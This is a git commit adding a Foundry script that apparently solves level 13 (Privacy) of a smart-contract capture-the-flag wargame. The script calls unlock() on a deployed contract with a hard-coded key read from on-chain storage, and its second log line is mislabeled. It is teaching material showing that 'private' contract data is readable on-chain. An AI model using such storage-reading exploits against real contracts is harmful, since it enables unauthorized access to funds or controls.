497fb32220ac5baeb532a7ef6feb6feb8d6f33e2
SamijoeHayek <samijoehayek1@gmail.com>
2024-04-27 20:48:42 +0300

    Added solution for lvl13

--- script/Privacy.s.sol
+++ script/Privacy.s.sol
@@ -1,13 +1,20 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import {Script, console} from "forge-std/Script.sol";
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
 import {Privacy} from "../src/Privacy.sol";
 
 contract PrivacyScript is Script {
-    function setUp() public {}
+    Privacy public privacy =
+        Privacy(0xb0eb6bC7715d0cED94dE35E7381278937722849D);
 
     function run() public {
-        vm.broadcast();
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        bytes32 key = 0xef501a5af4a467001e25f38890b74fba2c99ad821f55d00f532b67fdbe13fe50;
+        console.log("Before unlocking: ", privacy.locked());
+        privacy.unlock(bytes16(key));
+        console.log("Before unlocking: ", privacy.locked());
+        vm.stopBroadcast();
     }
 }
